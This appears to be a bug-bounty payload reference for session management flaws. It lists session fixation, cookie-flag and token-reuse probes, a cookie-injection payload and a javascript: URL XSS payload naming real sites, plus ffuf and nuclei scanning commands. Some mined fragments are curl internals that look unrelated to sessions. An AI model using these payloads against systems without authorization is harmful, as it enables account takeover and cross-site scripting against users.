# Payloads — Session Management Flaws

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# Session — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Set-Cookie -> `; SameSite=None` without Secure

- Fixate -> `PHPSESSID=attacker` before login

- Reuse -> old token after logout/password change



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 5× | `rtsp_connect()` |

| 5× | `$\x00\x00\x10` |

| 3× | `Curl_ws_accept()` |

| 3× | `Curl_ssl_scache_take()` |

| 3× | `rtsp_filter_rtp()` |

| 3× | `rtsp_done()` |

| 2× | `(valid_until > 0) && (valid_until < now)` |

| 2× | `(-1 > 0) = FALSE` |

| 2× | `curl_easy_ssls_export()` |

| 2× | `valid_until < 0` |

| 2× | `match_ssl_primary_config()` |

| 2× | `SSL_connect()` |

| 2× | `rtspc->in_header = FALSE` |

| 2× | `rtspc->buf` |

| 2× | `curl -c cookies.txt -b cookies.txt https://somesite.tld:9999/` |

| 2× | `ssl_peer_key_build()` |

| 2× | `peer->origin->scheme->family` |

| 1× | `document.cookie='_flow_session=EVIL;domain=.shopifycloud.com;path=/';` |

| 1× | `javascript://www.linkedin.com/%0aalert(1)` |

| 1× | `javascript://www.linkedin.com/%0aalert(1)?renderContext=trustVerificationDeeplink` |



## Parameters observed



`proto` · `title` · `setlang` · `renderContext` · `batch_time` · `environmentId` · `action` · `shop` · `verificationUrl` · `sentry_key` · `utm_swu` · `ddsource` · `ddtags` · `demo_param` · `usp` · `password` · `id` · `commit` · `_ga` · `tenantId`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_session.txt` | 70 |

| `~/.local/share/hackerone-reports/wordlists/params_session.txt` | 57 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_session.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_session.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Check cookie flags and token lifecycle by hand; scanner coverage is thin.



```sh

nuclei -u https://target -tags cookie,session,jwt,token \

       -severity low,medium,high,critical -rl 40 -o nuclei_session.txt

nuclei -u https://target -t ~/nuclei-templates/http/misconfiguration \

       -rl 40 -o nuclei_session_misconfiguration.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
